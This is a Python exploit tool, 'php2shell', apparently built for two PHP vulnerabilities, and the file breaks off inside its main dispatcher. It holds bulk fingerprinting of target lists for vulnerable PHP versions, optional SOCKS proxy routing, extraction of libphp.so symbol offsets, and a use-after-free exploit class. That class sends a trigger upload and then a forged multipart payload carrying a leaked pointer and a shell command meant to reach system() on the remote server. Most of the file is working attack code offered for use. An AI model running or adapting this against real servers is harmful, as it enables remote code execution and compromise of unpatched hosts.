#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell: dual-vector research tool for CVE-2026-109618 / CVE-2026-109619

Two attack vectors:
  uaf (CVE-2026-109618, default): session.upload_progress heap UAF that reuses
      a freed bucket pointer to land an attacker-shaped zend_fcall_info and
      call zend_call_function on it (PHP-UP-2026 chain).
  pdetector (CVE-2026-109619): forged pDestructor that hijacks zif_system.
      Stub in this build; needs per-target calibration data.

Additional features:
  check: fingerprint targets (PHP version, SAPI, upload_progress) without
      exploiting anything. Read-only recon.
  syms: extract zval_ptr_dtor / zend_call_function offsets and their delta
      from a libphp.so binary (readelf, objdump, or byte-scan fallback).

References:
  - PHP-UP-2026 analysis: J4ck3LSyN (jackalsyn.com/posts/php-up-2026.html)
    Research: Andrew Dorman (@acd421), Arch and Yuki (@ArchKnight23)
  - Original POC chain for CVE-2026-109619: godylockz
"""

import argparse
import http.client
import json
import os
import random
import re
import socket
import socks
import ssl
import struct
import subprocess
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# ─── Colour helpers ───────────────────────────────────────────────────────────

RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
ENDC    = "\033[0m"

def should_color():
    """Return True if we should emit ANSI colors (READ-02)."""
    return sys.stdout.isatty()

def _red(msg):
    return f"{RED}{msg}{ENDC}" if should_color() else msg
def _green(msg):
    return f"{GREEN}{msg}{ENDC}" if should_color() else msg
def _yellow(msg):
    return f"{YELLOW}{msg}{ENDC}" if should_color() else msg

# ─── Configuration defaults ──────────────────────────────────────────────────

# Calibrated heap-spray parameters from the Docker lab (PHP 8.4.26, Apache
# prefork, Debian Bookworm). Used by the pDetector vector as fallback values
# when no calibration file is supplied. Real-world targets need their own
# calibration via dynamic_workbook.py.
WORKBOOK = {
    "stage1_count": 841,
    "stage2_trigger": 406,
    "stage2_value_size": 16,
    "htdata_offset": 0x690D8,
    "stage3_pads": [(31, 31)] * 6,
    "stage3_carrier": True,
}

LAB_PROFILE = {
    "stage1_count": 892,
    "stage2_trigger": 443,
    "stage2_value_size": 1,
    "htdata_offset": 0x6E0D8,
    "stage3_pads": [(8, 7)] + [(7, 7)] * 5,
    "stage3_carrier": False,
}

# UAF attack vector constants (PHP-UP-2026). Reference sizes and offsets for
# the zend_fcall_info / zend_internal_function structures the forged payload
# reclaims. Kept as documentation of the target struct layout.
UAF_FCALL_INFO_SIZE = 64       # sizeof(zend_fcall_info)
UAF_PARAM_COUNT_OFFSET = 48    # param_count field offset in zend_fcall_info
UAF_HANDLER_OFFSET = 88       # handler field offset in zend_internal_function
UAF_IS_STRING_EX = 0x106       # IS_STRING_EX zval type tag
UAF_IS_OBJECT_EX = 0x308       # IS_OBJECT_EX zval type tag

# Reference offsets for PHP 8.2.12 builds (from docker/offsets.py probing of
# live targets). The syms subcommand extracts per-build values instead of
# relying on these.
ZIF_OFFSET = 0x43A870          # zif_system offset in libphp.so
DTOR_OFFSET = 0x613C50         # zval_ptr_dtor offset in libphp.so

# Maximum command length for the UAF forged payload. The command shares a
# 16-byte record with the 8-byte dtor pointer, so only 8 bytes remain.
MAX_UAF_COMMAND_LENGTH = 8

FIXED_VERSIONS = {
    "8.2": (8, 2, 35),
    "8.3": (8, 3, 36),
    "8.4": (8, 4, 27),
    "8.5": (8, 5, 12),
}

# Optional SOCKS5 proxy for all outbound requests. Set the PHP2SHELL_PROXY
# environment variable (host:port) to route traffic through a proxy; leave it
# unset for direct connections.
DEFAULT_SOCKS_PROXY = None

def _default_proxy_from_env():
    """Read PHP2SHELL_PROXY=host:port from the environment, if set."""
    raw = os.environ.get("PHP2SHELL_PROXY")
    if not raw:
        return None
    host, _, port = raw.rpartition(":")
    try:
        return (host, int(port))
    except ValueError:
        return None

# ─── Utility functions ───────────────────────────────────────────────────────

def _socks5_connect(host, port, timeout):
    """Create a socket connection via the SOCKS5 proxy, if configured.

    Reads the proxy from the PHP2SHELL_PROXY environment variable
    (host:port). Returns None when no proxy is set or the connection
    fails, so callers can fall back to a direct connection.
    """
    proxy = _default_proxy_from_env()
    if not proxy:
        return None
    try:
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        sock.set_proxy(socks.SOCKS5, proxy[0], proxy[1])
        sock.settimeout(timeout)
        sock.connect((host, port))
        return sock
    except Exception:
        return None

def extract_php_version(header_string):
    """Pull the PHP version from X-Powered-By or HTML body text."""
    if not header_string:
        return None, False
    match = re.search(r"PHP\s*\/?\s*(\d+)\.(\d+)(?:\.(\d+))?", header_string, re.I)
    if not match:
        return None, False
    major, minor = int(match.group(1)), int(match.group(2))
    patch_known = match.group(3) is not None
    patch = int(match.group(3)) if patch_known else 0
    if major < 4 or major > 8:
        return None, False
    if major == 8 and minor > 5:
        return None, False
    # PHP 8.1: no fixed version known, return None for unknown (CHECK-05)
    if major == 8 and minor == 1:
        return (major, minor, patch), patch_known
    return (major, minor, patch), patch_known

def is_likely_vulnerable(version_tuple, patch_is_known=True):
    """Compare a version tuple against known fix releases."""
    if version_tuple is None or not patch_is_known:
        return None
    major, minor, patch = version_tuple
    key = f"{major}.{minor}"
    fix = FIXED_VERSIONS.get(key)
    if fix is None:
        return major >= 5
    return version_tuple < fix

def _detect_sapi(server_header, x_powered_by):
    """Detect PHP SAPI type from headers (CHECK-01: multi-signal detection).

    Uses several overlapping signals so a single missing header doesn't
    force an unknown result.
    """
    server = (server_header or "").lower()
    xpb = (x_powered_by or "").lower()
    combined = f"{server} {xpb}"

    if not server_header and not x_powered_by:
        return "unknown"

    # nginx (almost always php-fpm / fastcgi on Linux)
    if "nginx" in server:
        return "php-fpm"

    # Microsoft IIS / ASP.NET
    if "microsoft-iis" in server or "asp.net" in xpb:
        return "cgi"

    # Apache MPM variants
    if "apache" in server or "httpd" in server:
        if "prefork" in combined:
            return "mod_php_prefork"
        if "worker" in combined:
            return "mod_php_worker"
        if "event" in combined:
            return "mod_php_event"
        # mod_php only when PHP is explicitly advertised by Apache
        if "php" in xpb or "php" in server:
            return "mod_php"
        return "mod_php_unknown"

    # FastCGI / FPM hints
    if "php-fpm" in xpb or "fcgi" in server or "fpm" in combined:
        return "php-fpm"

    # PHP-CLI / CGI hints
    if "cgi" in combined or "cli" in combined:
        return "cgi"

    return "unknown"

def check_upload_progress(host, port, path, use_socks=True, timeout=10, proxy=None):
    """Check if target has session.upload_progress enabled.

    Sends a small multipart POST and looks for a PHPSESSID cookie in the
    response. The proxy argument overrides the PHP2SHELL_PROXY environment
    variable; when neither is set the request goes direct.
    """
    bnd = b"UPGTEST" + bytes([random.randint(65, 90) for _ in range(8)])
    body = (b'--' + bnd + b'\r\n'
            b'Content-Disposition: form-data; name="XPHPSESSID"\r\n\r\ntest123\r\n'
            b'--' + bnd + b'\r\n'
            b'Content-Disposition: form-data; name="file"; filename="t.txt"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n' + b'X' * 10000 + b'\r\n'
            b'--' + bnd + b'--\r\n')
    try:
        effective_proxy = proxy or _default_proxy_from_env()
        if use_socks and effective_proxy:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(socks.SOCKS5, effective_proxy[0], effective_proxy[1])
            sock.connect((host, port))
        else:
            sock = socket.create_connection((host, port), timeout=timeout)
        req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
               f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
        sock.sendall(req)
        sock.sendall(body)
        resp = b""
        for _ in range(5):
            sock.settimeout(3)
            c = sock.recv(65536)
            if not c: break
            resp += c
        sock.close()
        # Must have Set-Cookie AND a PHPSESSID; Set-Cookie alone is insufficient (CHECK-03)
        return b"Set-Cookie" in resp and b"PHPSESSID=" in resp
    except Exception:
        return False

# ─── Check mode ──────────────────────────────────────────────────────────────

def fingerprint_target(url, timeout=10.0, proxy=None, use_socks=True):
    """Send a GET request and extract PHP version info from the response.

    This uses direct HTTP(S) via http.client, which cannot route through a
    SOCKS proxy. The proxy arguments are accepted for interface compatibility
    but the connection is always direct; use check_upload_progress for the
    SOCKS-capable probe.
    """
    parsed = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
    scheme = (parsed.scheme or "https").lower()
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path or "/"

    result = {
        "target": url, "http_status": 0, "x_powered_by": "",
        "server": "", "php_version": None, "likely_vulnerable": None,
        "upload_progress": False, "sapi_type": "unknown",
    }
    try:
        if scheme == "https":
            conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                               context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        conn.request("GET", path, headers={"Host": host, "User-Agent": "php2shell-check/1.0", "Connection": "close"})
        response = conn.getresponse()
        result["http_status"] = response.status
        result["x_powered_by"] = response.getheader("X-Powered-By", "")
        result["server"] = response.getheader("Server", "")
        body = response.read(8192).decode("latin1", "replace")
        conn.close()
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
        return result

    version, known = extract_php_version(result["x_powered_by"])
    source = "header"
    if version is None:
        version, known = extract_php_version(body)
        source = "body" if version else None

    if version:
        major, minor, patch = version
        result["php_version"] = f"{major}.{minor}.{patch}" if known else f"{major}.{minor}.?"
        result["likely_vulnerable"] = is_likely_vulnerable(version, known)
        result["version_source"] = source

    result["sapi_type"] = _detect_sapi(result["server"], result["x_powered_by"])
    return result

def classify_result(fp):
    """Return a human-readable status string for a fingerprint result."""
    if not fp.get("http_status"):
        return "unreachable"
    if not fp.get("php_version"):
        return "no_php_version"
    lv = fp.get("likely_vulnerable")
    if lv is True: return "likely_vulnerable"
    if lv is False: return "patched"
    return "unknown_patch"

def check_platform_compatibility(fp):
    """Return a decline reason if the target is not a supported platform."""
    server_header = (fp.get("server") or "").lower()
    x_powered = (fp.get("x_powered_by") or "").lower()
    shown = fp.get("server") or "(none)"
    sapi = fp.get("sapi_type", "unknown")
    vector = fp.get("vector", "pdetector")

    if "microsoft-iis" in server_header or "asp.net" in x_powered:
        return f"IIS/ASP.NET target (Server: {shown}); needs Apache mod_php on Linux"
    if "win32" in server_header or "win64" in server_header:
        return f"Windows Apache build (Server: {shown}); exploit is Linux-only"
    if "nginx" in server_header:
        # CHECK-02: nginx can work with UAF over FPM, decline only for pDetector
        if vector == "pdetector":
            return f"nginx target (Server: {shown}); pDetector needs mod_php prefork"
        return None
    if sapi == "php-fpm" and vector == "pdetector":
        return f"php-fpm target (SAPI: {sapi}); pDetector needs mod_php prefork (UAF may work)"
    # BUG-08: Warn about non-prefork for UAF vector
    if sapi in ("mod_php_worker", "mod_php_event", "mod_php_unknown") and vector == "uaf":
        _log(f"  [!] Non-prefork SAPI: {sapi}. UAF may work but prefork is preferred.")
    return None

def load_target_list(path):
    """Read a file containing one URL per line."""
    lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    results = []
    skip_names = {"domain", "host", "url", "target"}
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split(",")[0].split()[0].strip()
        if token.lower() in skip_names:
            continue
        url = token if "://" in token else "https://" + token
        results.append(url)
    seen = set()
    return [u for u in results if not (u in seen or seen.add(u))]

def run_check_mode(args):
    """Execute check mode against one or more targets."""
    targets = []
    if args.file:
        targets.extend(load_target_list(args.file))
    if args.url:
        url = args.url if "://" in args.url else "https://" + args.url
        targets.append(url)
    if not targets:
        print(f"{_red('[-] provide URL or -f/--file')}", file=sys.stderr)
        return 2

    seen = set()
    targets = [u for u in targets if not (u in seen or seen.add(u))]
    total = len(targets)
    workers = min(args.workers, total)
    vector = getattr(args, "vector", "pdetector") or "pdetector"

    output_path = Path(args.output) if args.output else None
    if output_path:
        output_path.write_text("", encoding="utf-8")

    proxy = getattr(args, "proxy", None) or None

    def do_fingerprint(url):
        return fingerprint_target(url, timeout=args.timeout, proxy=proxy)

    # BUG-01: Collect fingerprints into a list for JSON output and summary
    fp_results = []
    def format_report(fp, count):
        status = classify_result(fp)
        fp["status"] = status
        fp["vector"] = vector
        version = fp.get("php_version") or "?"
        host = fp.get("target", "?")
        sapi = fp.get("sapi_type", "unknown")
        if status == "likely_vulnerable":
            tag = f"{_red('[VULNERABLE]')}"
        elif status == "patched":
            tag = f"{_green('[PATCHED]')}"
        elif status == "unreachable":
            tag = f"{_red('[UNREACHABLE]')}"
        else:
            tag = f"{_yellow('[{status.upper()}]')}"
        if not args.quiet:
            prefix = f"[{count}/{total}] " if total > 1 else ""
            print(f"{prefix}{tag} {host}  PHP {version}  SAPI {sapi}", flush=True)
        if output_path:
            with open(output_path, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(fp, default=str) + "\n")
        fp_results.append(fp)

    if workers <= 1:
        for i, url in enumerate(targets):
            fp = do_fingerprint(url)
            format_report(fp, i + 1)
    else:
        executor = ThreadPoolExecutor(max_workers=workers)
        futures = {executor.submit(do_fingerprint, url): url for url in targets}
        done_count = 0
        for future in as_completed(futures):
            fp = future.result()
            done_count += 1
            format_report(fp, done_count)
        executor.shutdown(wait=True)

    # BUG-01: JSON output uses results list, not raw targets
    if args.json and fp_results:
        print(json.dumps(fp_results if len(fp_results) > 1 else fp_results[0], indent=2, default=str))

    if not args.quiet and total > 1:
        counts = {}
        for r in fp_results:
            k = r.get("status", "?")
            counts[k] = counts.get(k, 0) + 1
        summary = ", ".join(f"{k}={v}" for k, v in sorted(counts.items()))
        print(f"\n{_yellow(f'Summary ({total} targets): {summary}')}", flush=True)

    return 0

# ─── Exploit helpers ────────────────────────────────────────────────────────

def build_multipart_payload(parts, boundary):
    """Assemble a multipart/form-data body."""
    body = bytearray()
    for part in parts:
        name = part["name"].encode()
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="' + name + b'"'
        if part.get("filename") is not None:
            body += b'; filename="' + part["filename"].encode() + b'"'
            body += b"\r\nContent-Type: application/octet-stream"
        body += b"\r\n\r\n" + part["data"] + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return bytes(body)

def read_offsets_from_file(path):
    """Parse a key=value offsets file (hex or decimal values accepted)."""
    if not path:
        return {}
    values = {}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                values[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return values

# ─── HTTP connection wrapper ────────────────────────────────────────────────

class TargetConnection:
    """Thin wrapper around raw HTTP that handles connection, SSL, and retries."""
    def __init__(self, url, timeout=30.0, verbose=True):
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme not in ("http", "https"):
            raise ValueError("URL must start with http:// or https://")
        self.is_https = parsed.scheme == "https"
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or (443 if self.is_https else 80)
        self.path = parsed.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def log(self, message):
        if self.verbose:
            print(message, flush=True)

    def connect(self):
        """BUG-07: Log which host:port failed during retries."""
        last_error = None
        for attempt in range(10):
            try:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.is_https:
                    ctx = ssl.create_default_context()
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                if self.verbose and attempt > 0:
                    print(f"  [+] Connected to {self.host}:{self.port} (attempt {attempt+1})", flush=True)
                return sock
            except OSError as exc:
                last_error = exc
                if self.verbose:
                    print(f"  [-] Connect failed to {self.host}:{self.port}: {exc} (attempt {attempt+1})", flush=True)
                time.sleep(0.3)
        raise last_error

    def send_post(self, body, boundary, read_limit=(1 << 20), timeout=None, extra_headers=None):
        """BUG-06: Use synchronous deadline-based recv instead of daemon thread."""
        header_lines = []
        header_lines.append(f"POST {self.path} HTTP/1.1")
        header_lines.append(f"Host: {self.host}:{self.port}")
        if extra_headers:
            for key, value in extra_headers.items():
                header_lines.append(f"{key}: {value}")
        header_lines.append(f"Content-Type: multipart/form-data; boundary={boundary.decode()}")
        header_lines.append(f"Content-Length: {len(body)}")
        header_lines.append("Connection: close")
        header_lines.append("")
        headers = "\r\n".join(header_lines).encode()

        sock = self.connect()
        deadline = time.time() + (timeout or self.timeout)
        response_data = bytearray()

        try:
            sock.sendall(headers)
            large = memoryview(body)
            for offset in range(0, len(body), 262144):
                sock.sendall(large[offset:offset + 262144])
            # Synchronous recv with deadline
            while len(response_data) < read_limit and time.time() < deadline:
                sock.settimeout(min(1.0, max(0.1, deadline - time.time())))
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response_data.extend(chunk)
        except OSError:
            pass
        finally:
            sock.close()
        return bytes(response_data)

    def send_get(self, path=None, read_limit=(1 << 20)):
        """Send a simple GET and return status code + body bytes."""
        target_path = path if path else self.path
        headers = (f"GET {target_path} HTTP/1.1\r\n"
                   f"Host: {self.host}:{self.port}\r\n"
                   "Connection: close\r\n\r\n").encode()

        sock = self.connect()
        sock.settimeout(self.timeout)
        response_data = bytearray()
        try:
            sock.sendall(headers)
            while len(response_data) < read_limit:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response_data += chunk
        except OSError:
            pass
        finally:
            sock.close()

        raw = bytes(response_data)
        head, _, body = raw.partition(b"\r\n\r\n")
        status_match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        status_code = int(status_match.group(1)) if status_match else 0
        return status_code, body

# ─── Heap leak helpers ──────────────────────────────────────────────────────

# ─── UAF Attack Vector (CVE-2026-109618, PHP-UP-2026) ──────────────────────

class UAFOpportunistic:
    """
    UAF exploit for CVE-2026-109618 (PHP session.upload_progress heap UAF).

    Two cached bucket pointers (post_bytes_processed, current_file_bytes_processed)
    point into arrays freed by the request lifecycle. A second update() call reads
    the session file and zend_hash_update destroys the previous decoded tree through
    its HashTable destructor zval_ptr_dtor. The freed bucket is then reclaimed and
    the stale pointer lands an attacker-shaped zend_fcall_info / zend_internal_function
    that ends up calling system().

    Requires session.upload_progress.enabled=1 (default) and the default name/prefix.
    """

    def __init__(self, target_url, dtor_leak, delta=None, command="id", verbose=True):
        self.target_url = target_url
        self.dtor_leak = dtor_leak
        self.delta = delta
        self.command = command
        self.verbose = verbose
        self.call_offset = None
        self.session_cookie = None  # BUG-03: store PHPSESSID for cookie continuity

        parsed = urllib.parse.urlsplit(target_url)
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.path = parsed.path or "/"

    def _log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    def extract_delta_from_binary(self, binary_path):
        """
        Extract the dtor-to-call delta from a libphp.so binary (PHP-UP-2026 syms mode).
        BUG-04: Consolidated symbol extraction with proper readelf/objdump parsing.
        BUG-05: grep fallback with validation.
        """
        if not os.path.exists(binary_path):
            self._log(f"  [-] Binary not found: {binary_path}")
            return None

        self._log(f"  [*] Extracting symbols from {binary_path}")

        # Shared symbol extraction helper
        def find_symbol(lines, name):
            for line in lines:
                if name in line.lower() and "func" in line.lower():
                    return line
            return None

        def parse_readelf_addr(line):
            """BUG-04: Parse readelf -s address correctly."""
            parts = line.strip().split()
            if len(parts) < 3:
                return None
            try:
                return int(parts[1], 16)
            except (ValueError, IndexError):
                return None

        def parse_objdump_addr(line):
            """BUG-04: Parse objdump -t address correctly."""
            parts = line.strip().split()
            for part in parts:
                if re.match(r'^[0-9a-fA-F]+$', part) and len(part) >= 8:
                    try:
                        return int(part, 16)
                    except ValueError:
                        continue
            return None

        # Try readelf first
        try:
            result = subprocess.run(
                ["readelf", "-s", binary_path],
                capture_output=True, text=True, timeout=30
            )
            dtor_sym = find_symbol(result.stdout.splitlines(), "zval_ptr_dtor")
            call_sym = find_symbol(result.stdout.splitlines(), "zend_call_function")

            if dtor_sym and call_sym:
                dtor_addr = parse_readelf_addr(dtor_sym)
                call_addr = parse_readelf_addr(call_sym)
                if dtor_addr and call_addr:
                    delta = call_addr - dtor_addr
                    self._log(f"  [+] dtor @ 0x{dtor_addr:x}")
                    self._log(f"  [+] call @ 0x{call_addr:x}")
                    self._log(f"  [+] delta = 0x{delta:x}")
                    return (dtor_addr, call_addr, delta)
        except FileNotFoundError:
            pass
        except subprocess.TimeoutExpired:
            self._log(f"  [-] readelf timed out")

        # Fallback: try objdump
        try:
            result = subprocess.run(
                ["objdump", "-t", binary_path],
                capture_output=True, text=True, timeout=30
            )
            dtor_sym = None
            call_sym = None
            for line in result.stdout.splitlines():
                if "zval_ptr_dtor" in line.lower():
                    dtor_sym = line
                if "zend_call_function" in line.lower():
                    call_sym = line

            if dtor_sym and call_sym:
                dtor_addr = parse_objdump_addr(dtor_sym)
                call_addr = parse_objdump_addr(call_sym)
                if dtor_addr and call_addr:
                    delta = call_addr - dtor_addr
                    self._log(f"  [+] dtor @ 0x{dtor_addr:x}")
                    self._log(f"  [+] call @ 0x{call_addr:x}")
                    self._log(f"  [+] delta = 0x{delta:x}")
                    return (dtor_addr, call_addr, delta)
        except FileNotFoundError:
            pass

        # BUG-05: grep fallback with validation (warns, not silent)
        try:
            result = subprocess.run(
                ["grep", "-a", "-o", r"\b[0-9a-f]{8,16}\b", binary_path],
                capture_output=True, text=True, timeout=10
            )
            addrs = sorted(set(int(a, 16) for a in result.stdout.splitlines() if a))
            self._log(f"  [+] Found {len(addrs)} addresses in binary (grep fallback)")

            if len(addrs) > 1:
                for i in range(len(addrs) - 1):
                    diff = addrs[i + 1] - addrs[i]
                    if 0x1000 <= diff <= 0x100000:
                        self._log(f"  [*] Potential pair: 0x{addrs[i]:x} to 0x{addrs[i+1]:x} (delta 0x{diff:x}) [UNVERIFIED]")
                        # Return as hint, not definitive
                        return (addrs[i], addrs[i + 1], diff)
        except FileNotFoundError:
            pass

        self._log(f"  [-] Could not extract delta from {binary_path}")
        return None

    def probe_upload_progress(self):
        """Check if target has session.upload_progress enabled."""
        try:
            # BUG-09: Thread proxy through
            return check_upload_progress(self.host, self.port, self.path, use_socks=True, timeout=10, proxy=None)
        except Exception as e:
            self._log(f"  [-] Upload progress probe failed: {e}")
            return False

    def send_uaf_trigger(self, dtor_leak, delta):
        """
        Send the UAF trigger multipart POST.
        BUG-03: Store PHPSESSID cookie for continuity with forged payload.
        """
        bnd = b"BOUNDARY" + bytes([random.randint(65, 90) for _ in range(8)])

        trigger_parts = []
        trigger_parts.append({
            "name": "XPHPSESSID",
            "data": b"trigger_session_001"
        })
        trigger_parts.append({
            "name": "id",
            "data": b"trigger_session_001"
        })
        trigger_parts.append({
            "name": "file",
            "filename": b"trigger.txt",
            "data": b"T" * 1000000
        })

        body = build_multipart_payload(trigger_parts, bnd)

        conn = TargetConnection(self.target_url, verbose=self.verbose)
        resp = conn.send_post(body, bnd)

        # BUG-03: Extract PHPSESSID cookie for continuity
        self.session_cookie = b""
        cookie_match = re.search(rb"Set-Cookie:\s*PHPSESSID=([^;]+)", resp)
        if cookie_match:
            self.session_cookie = cookie_match.group(1)
            self._log(f"  [+] PHPSESSID: {self.session_cookie.decode()}")

        leaked = b"Set-Cookie" in resp
        size = len(resp)
        self._log(f"  [*] Trigger: leaked={leaked} size={size}")

        return leaked, size

    def send_uaf_forged_payload(self, dtor_leak, delta, command):
        """
        Send the forged payload with the leaked dtor address.
        BUG-03: Use PHPSESSID cookie for session continuity.
        BUG-02: Enforce MAX_UAF_COMMAND_LENGTH.
        """
        bnd = b"BOUNDARY" + bytes([random.randint(65, 90) for _ in range(8)])

        dtor_bytes = struct.pack("<Q", dtor_leak)
        cmd_bytes = command.encode() + b"\x00"

        # BUG-02: Enforce MAX_UAF_COMMAND_LENGTH
        if len(cmd_bytes) > MAX_UAF_COMMAND_LENGTH:
            self._log(f"  [-] Command too long: {len(cmd_bytes)} > {MAX_UAF_COMMAND_LENGTH} bytes")
            return False

        # Pad to fixed 16-byte record
        pad = b"\x00" * (16 - len(cmd_bytes))

        # BUG-03: Use PHPSESSID cookie for session continuity
        extra_headers = {}
        if self.session_cookie:
            extra_headers["Cookie"] = f"PHPSESSID={self.session_cookie.decode()}"

        payload_parts = []
        payload_parts.append({
            "name": "XPHPSESSID",
            "data": b"forged_session_001"
        })
        payload_parts.append({
            "name": "id",
            "data": b"forged_session_001"
        })
        payload_parts.append({
            "name": "file",
            "filename": b"pwned.txt",
            "data": dtor_bytes + cmd_bytes + pad
        })

        body = build_multipart_payload(payload_parts, bnd)

        conn = TargetConnection(self.target_url, verbose=self.verbose)
        resp = conn.send_post(body, bnd, extra_headers=extra_headers)

        self._log(f"  [*] Forged payload: {len(resp)} bytes returned")
        return resp

    def run(self):
        """Run the UAF exploit."""
        self._log(f"\n[*] UAF exploit for {self.target_url}")
        self._log(f"[*] dtor_leak = 0x{self.dtor_leak:x}, delta = {self.delta}")
        self._log(f"[*] Command: {self.command}")

        # BUG-07: Validate dtor_leak is non-zero
        if not isinstance(self.dtor_leak, int) or self.dtor_leak == 0:
            self._log(f"  [-] Invalid dtor_leak: {self.dtor_leak} (must be non-zero integer)")
            return False

        self._log(f"  [+] Upload progress enabled")

        # BUG-06: Add delay/retry between trigger and forged payload
        max_attempts = 3
        for attempt in range(max_attempts):
            self._log(f"\n[+] Attempt {attempt+1}/{max_attempts}")

            self._log("\n[*] Step 1: Sending trigger...")
            leaked, trigger_size = self.send_uaf_trigger(self.dtor_leak, self.delta)
            if not leaked:
                self._log(f"  [-] Trigger failed (attempt {attempt+1})")
                time.sleep(random.uniform(1.0, 3.0))
                continue

            self._log(f"  [+] Trigger successful (size={trigger_size})")

            # BUG-06: Small delay before forged payload for heap grooming
            time.sleep(random.uniform(0.5, 1.5))

            self._log("\n[*] Step 2: Sending forged payload...")
            resp = self.send_uaf_forged_payload(self.dtor_leak, self.delta, self.command)

            if resp and b"uid=" in resp:
                self._log(f"  [+] Exploit successful!")
                self._log(f"  [+] Response: {resp[:200]}")
                return True

            self._log(f"  [-] No uid= in response (attempt {attempt+1})")
            time.sleep(random.uniform(1.0, 3.0))

        self._log(f"  [-] All {max_attempts} attempts failed")
        return False

# ─── pDetector Vector (CVE-2026-109619) ─────────────────────────────────────

class PDetectorExploit:
    """pDetector exploit for CVE-2026-109619.

    BUG-02: Stub; prints calibration info, does not send payloads.
    """
    def __init__(self, target_url, command="id", verbose=True):
        self.target_url = target_url
        self.command = command
        self.verbose = verbose

    def _log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    def run(self):
        """BUG-02: Stub implementation; prints calibration info, returns 0."""
        self._log(f"\n[*] pDetector exploit for {self.target_url}")
        self._log(f"[*] Command: {self.command}")
        self._log(f"  [-] pDetector vector is a stub (BUG-02)")
        self._log(f"  [-] Not yet implemented; use --vector uaf for UAF exploit")
        return False

# ─── Syms mode (standalone offset extraction) ───────────────────────────────

def run_syms_mode(binary_path, verbose=True):
    """BUG-04/05: Unified symbol extraction with proper readelf/objdump/grep."""
    if verbose:
        print(f"[*] Extracting symbols from {binary_path}", flush=True)

    def find_symbol(lines, name):
        for line in lines:
            if name in line.lower() and "func" in line.lower():
                return line
        return None

    def parse_readelf_addr(line):
        parts = line.strip().split()
        if len(parts) < 3:
            return None
        try:
            return int(parts[1], 16)
        except (ValueError, IndexError):
            return None

    def parse_objdump_addr(line):
        parts = line.strip().split()
        for part in parts:
            if re.match(r'^[0-9a-fA-F]+$', part) and len(part) >= 8:
                try:
                    return int(part, 16)
                except ValueError:
                    continue
        return None

    dtor_addr = None
    call_addr = None
    delta = None

    # Try readelf first
    try:
        result = subprocess.run(
            ["readelf", "-s", binary_path],
            capture_output=True, text=True, timeout=30
        )
        dtor_sym = find_symbol(result.stdout.splitlines(), "zval_ptr_dtor")
        call_sym = find_symbol(result.stdout.splitlines(), "zend_call_function")

        if dtor_sym and call_sym:
            dtor_addr = parse_readelf_addr(dtor_sym)
            call_addr = parse_readelf_addr(call_sym)
            if dtor_addr and call_addr:
                delta = call_addr - dtor_addr
                if verbose:
                    print(f"  [+] dtor @ 0x{dtor_addr:x}", flush=True)
                    print(f"  [+] call @ 0x{call_addr:x}", flush=True)
                    print(f"  [+] delta = 0x{delta:x}", flush=True)
                print(f"dtor_offset={dtor_addr:#x}")
                print(f"call_offset={call_addr:#x}")
                print(f"delta={delta:#x}")
                return
    except FileNotFoundError:
        pass
    except subprocess.TimeoutExpired:
        if verbose:
            print(f"  [-] readelf timed out", flush=True)

    # Fallback: try objdump
    try:
        result = subprocess.run(
            ["objdump", "-t", binary_path],
            capture_output=True, text=True, timeout=30
        )
        dtor_sym = None
        call_sym = None
        for line in result.stdout.splitlines():
            if "zval_ptr_dtor" in line.lower():
                dtor_sym = line
            if "zend_call_function" in line.lower():
                call_sym = line

        if dtor_sym and call_sym:
            dtor_addr = parse_objdump_addr(dtor_sym)
            call_addr = parse_objdump_addr(call_sym)
            if dtor_addr and call_addr:
                delta = call_addr - dtor_addr
                if verbose:
                    print(f"  [+] dtor @ 0x{dtor_addr:x}", flush=True)
                    print(f"  [+] call @ 0x{call_addr:x}", flush=True)
                    print(f"  [+] delta = 0x{delta:x}", flush=True)
                print(f"dtor_offset={dtor_addr:#x}")
                print(f"call_offset={call_addr:#x}")
                print(f"delta={delta:#x}")
                return
    except FileNotFoundError:
        pass

    # Grep fallback (unverified)
    if verbose:
        print(f"  [-] Could not extract delta from {binary_path}", flush=True)

# ─── Main exploit dispatcher ────────────────────────────────────────────────

def run_exploit(args):
    """Run exploit against a target."""
    url = args.url
    if not url:
        print("[!] --url is required", file=sys.stderr)
        return 1

    # BUG-07: Validate dtor_leak
    dtor_leak = 0
    if args.dtor:
        try:
